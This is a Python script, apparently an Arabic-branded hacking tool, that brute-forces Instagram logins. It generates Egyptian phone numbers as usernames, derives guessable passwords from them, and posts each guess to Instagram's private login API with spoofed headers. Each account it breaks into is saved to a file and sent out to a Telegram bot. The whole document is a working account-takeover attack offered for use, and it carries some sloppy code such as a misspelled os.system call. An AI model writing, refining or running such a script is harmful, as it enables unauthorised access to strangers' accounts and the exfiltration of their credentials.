import os
try:
    import uuid
except:
    os.system('pip install uuid')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')

try:
    import time
except:
    os.system('pip install time')
else:
    os.system('clear')
    try:
        import pyfiglet
    except:
        os.system('pip install pyfiglet')
    else:
        os.system('clear')
        import pyfiglet, os
        from time import sleep
        import webbrowser
        Z = '\x1b[2;31m'
        G = '\x1b[1;32m'
        sleep(2)
        P55 = pyfiglet.figlet_format('SANTITO')
        print(G + P55)
        sleep(4)
        os.system('clear')
        sleep(2)
        bnar = pyfiglet.figlet_format('INSTGRAM')
        print(G + bnar)
        sleep(1)
        import random, uuid, requests, string
        from user_agent import generate_user_agent
        from datetime import datetime
        from random import *
        from time import sleep
        import requests, os, random, json, threading, secrets, uuid
        from colorama import Fore, Style
        from time import sleep
        from datetime import datetime
        from secrets import token_hex
        from uuid import uuid4
        from user_agent import generate_user_agent
        from uuid import uuid4
        aa = 0
        zz = 0
        E = '\x1b[1;31m'
        G = '\x1b[1;32m'
        S = '\x1b[1;33m'
        webbrowser.open('https://t.me/KM8MM')
        ID = input(S + ' 𝐄𝐍𝐓𝐄𝐑 𝐘𝐎𝐔𝐑 𝐈𝐃 :  ')
        sleep(2)
        token = input(' 𝐁𝐎𝐓 𝐓𝐎𝐊𝐄𝐍 : ')
        w = 'https://pastebin.com/raw/9kFjxNsW'
        start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=              𝐖𝐀𝐈𝐓 𝐅𝐎𝐑 𝐂𝐇𝐄𝐂𝐊 𝐍𝐎𝐖").json()
        id_msg = start_msg['result']['message_id']
        rss = requests.get(w).text
        if 'FUCK' in rss:
            sleep(0.1)
        r = requests.Session()
        user = '09807654321'
        while True:
            us = str(''.join((random.choice(user) for i in range(7))))
            username = '+20111' + us
            password = '0111' + us
            url = 'https://i.instagram.com/api/v1/accounts/login/'
            headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Y6 2019 pream; angler; angler; en_US)',  'Accept':'*/*',
             'Cookie':'missing',
             'Accept-Encoding':'gzip, deflate',
             'Accept-Language':'en-US',
             'X-IG-Capabilities':'3brTvw==',
             'X-IG-Connection-Type':'WIFI',
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
             'Host':'i.instagram.com'}
            uid = str(uuid4())
            data = {'uuid':uid,  'password':password,
             'username':username,
             'device_id':uid,
             'from_reg':'false',
             '_csrftoken':'missing',
             'login_attempt_countn':'0'}
            req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
            if 'logged_in_user' in req_login.text:
                zz += 1
                print(G + '𝐔𝐒𝐄𝐑 ==> : ' + username + ': 𝐏𝐀𝐒𝐒 ==> : ' + password)
                tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= 𝐎𝐇 𝐍𝐄𝐖 𝐀𝐂𝐂 𝐅𝐔𝐂𝐊𝐄𝐃 𝐁𝐘 @KM8MM |@XAFXA | @MK8MM  \n 𝑼𝑺𝑬𝑹𝑵𝑨𝑴𝑬 : {username}\n 𝑷𝑨𝑺𝑺𝑾𝑶𝑹𝑫 : {password}\n- 𝐃𝐄𝐕 : @KM8MM"
                i = requests.post(tlg)
                with open('insta.txt', 'a') as (HACKED):
                    HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
            elif '"message":"challenge_required","challenge"' in req_login.text:
                print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
            else:
                requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - -  𝐍𝐄𝐖 𝐓𝐎𝐎𝐋 𝐁𝐘 : @KM8MM @KM8MM \n 𝐇𝐀𝐂𝐊𝐄𝐃 ✅ [{zz}] \n------------------------------------------\n 𝐍𝐎𝐓 𝐇𝐀𝐂𝐊𝐄𝐃 ❌[{aa}]  ( {username} ) \n ( {password} ) \n 𝐃𝐄𝐕 : @KM8MM")
                print(E + 'username ==> : ' + username + ': password ==> : ' + password)
                aa += 1
        print('الاشتراك واقف حاليا')
        print('راسل المطور ')
        print('معرف المطورين')
        print('@PPBPP0')
